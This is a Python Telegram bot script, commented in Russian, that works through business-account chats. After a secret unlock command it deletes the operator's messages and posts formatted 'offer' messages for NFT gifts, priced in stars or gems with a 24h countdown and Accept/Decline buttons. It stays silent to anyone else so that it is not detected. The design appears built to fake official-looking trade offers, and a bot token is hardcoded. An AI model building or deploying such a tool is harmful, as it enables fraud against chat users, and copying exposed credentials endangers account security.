import re
import asyncio
import logging
from aiogram import Bot, Dispatcher, types, F
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton
from aiogram.client.default import DefaultBotProperties
from aiogram.enums import ParseMode

# --- НАСТРОЙКИ ---
BOT_TOKEN = "9150035187:AAHA1yqlsiU1CwnGECEMP5VX_1cFrG4t0Ho" 
# Придумай свой секретный ключ. Лучше использовать рандомный набор букв и цифр.
SECRET_KEY = "/unlock_8f3k2m9x" 

logging.basicConfig(level=logging.INFO)
bot = Bot(token=BOT_TOKEN, default=DefaultBotProperties(parse_mode=ParseMode.HTML))
dp = Dispatcher()

# Простейшая база в памяти для хранения авторизованных пользователей.
# В идеале для продакшена использовать Redis или SQLite.
AUTHORIZED_USERS = set()

# --- ОБРАБОТЧИК СЕКРЕТНОГО КЛЮЧА ---
@dp.business_message(F.text == SECRET_KEY)
async def unlock_bot(message: types.Message):
    # Добавляем ID пользователя (владельца аккаунта) в список разрешенных
    AUTHORIZED_USERS.add(message.from_user.id)
    
    # Удаляем сообщение с ключом, чтобы его никто не увидел в истории чата
    try:
        await bot.delete_business_messages(
            business_connection_id=message.business_connection_id,
            message_ids=[message.message_id]
        )
    except Exception:
        pass

    # Можно отправить тихое уведомление, что бот активирован
    await bot.send_message(
        chat_id=message.chat.id,
        text="✅ Бот активирован. Теперь вы можете использовать /price.",
        business_connection_id=message.business_connection_id
    )

# --- ОСНОВНОЙ ОБРАБОТЧИК ЦЕНЫ ---
@dp.business_message(F.text.startswith("/price"))
async def handle_price_command(message: types.Message):
    # 1. ПРОВЕРКА АВТОРИЗАЦИИ
    if message.from_user.id not in AUTHORIZED_USERS:
        # Если пользователь не ввел ключ, бот игнорирует команду.
        # Мы не отправляем ошибку, чтобы посторонние не поняли, что бот "живой".
        return

    # 2. Удаляем команду
    try:
        await bot.delete_business_messages(
            business_connection_id=message.business_connection_id,
            message_ids=[message.message_id]
        )
    except Exception as e:
        logging.error(f"Не удалось удалить команду: {e}")

    # 3. Парсим команду
    pattern = r"^/price\s+(https?://\S+)\s+([\d\.]+)\s+(gram|stars)$"
    match = re.match(pattern, message.text, re.IGNORECASE)
    
    if not match:
        return

    nft_link, price_value, currency = match.groups()
    currency = currency.lower()

    nft_name_raw = nft_link.split('/')[-1].replace('-', '')
    nft_name_formatted = nft_name_raw.capitalize() 

    if currency == "stars":
        price_text = f"{price_value} ⭐" 
    else:
        price_text = f"{price_value} 💎" 

    # 4. Кнопки
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [
            InlineKeyboardButton(text="Отклонить", callback_data="decline_offer"),
            InlineKeyboardButton(text="Принять", callback_data="accept_offer")
        ]
    ])

    # 5. Текст
    final_text = (
        f"Пользователь <a href='tg://user?id={message.from_user.id}'>{message.from_user.full_name}</a>\n"
        f"предлагает вам {price_text} за подарок\n"
        f"\"{nft_name_formatted}\".\n\n"
        f"Предложение действует еще 24h 00m.\n\n"
        f"{nft_link}"
    )

    # 6. Отправка
    try:
        await bot.send_message(
            chat_id=message.chat.id,
            text=final_text,
            business_connection_id=message.business_connection_id,
            reply_markup=keyboard,
            disable_web_page_preview=False
        )
    except Exception as e:
        logging.error(f"Ошибка при отправке: {e}")

# --- КНОПКИ ---
@dp.callback_query(F.data == "accept_offer")
async def accept_offer(callback: types.CallbackQuery):
    await callback.answer("Вы приняли предложение! (Тестовое действие)", show_alert=True)

@dp.callback_query(F.data == "decline_offer")
async def decline_offer(callback: types.CallbackQuery):
    await callback.answer("Вы отклонили предложение. (Тестовое действие)", show_alert=True)

async def main():
    print("Бот запущен. Ожидание секретного ключа...")
    await dp.start_polling(bot, allowed_updates=["business_connection", "business_message", "callback_query"])

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("Бот остановлен.")
